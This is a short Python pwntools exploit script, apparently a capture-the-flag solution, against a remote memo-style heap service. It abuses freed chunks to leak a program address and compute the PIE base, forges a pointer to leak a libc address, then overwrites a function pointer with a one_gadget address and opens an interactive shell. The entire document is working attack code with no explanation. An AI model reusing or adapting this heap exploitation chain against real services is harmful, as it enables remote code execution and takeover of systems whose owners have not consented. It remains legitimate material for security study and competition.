from pwn import *

p = remote("54.180.60.212", 1003)

def add(size,data):
	print p.sendlineafter("Exit","1")
	print p.sendlineafter(":",str(size))
	print p.sendafter("memo\n",str(data))

def delete(idx):
	print p.sendlineafter("Exit","3")
	print p.sendlineafter("number",str(idx))

def show(idx):
	print p.sendlineafter("Exit","2")
	print p.sendlineafter("number",str(idx))


add(80,"CCCC")
add(80,"CCCC")
delete(0)
delete(1)
add(15,"PPPPPPPP")
show(1)

print p.recvuntil("P"*8)
leak = u64(p.recv(6).ljust(8,"\x00"))
pie_base = leak - 0xc3e
print hex(pie_base)
delete(2)

add(15,p64(pie_base+0x202050))
show(0)

print p.recvuntil("0-3")
leak = u64(p.recv(6).ljust(8,"\x00"))
libc_base = leak - 0x6fe70
one = libc_base + 0xF1147
print hex(leak)

delete(1)
add(15,"B"*8 + p64(one))
show(0)
p.interactive()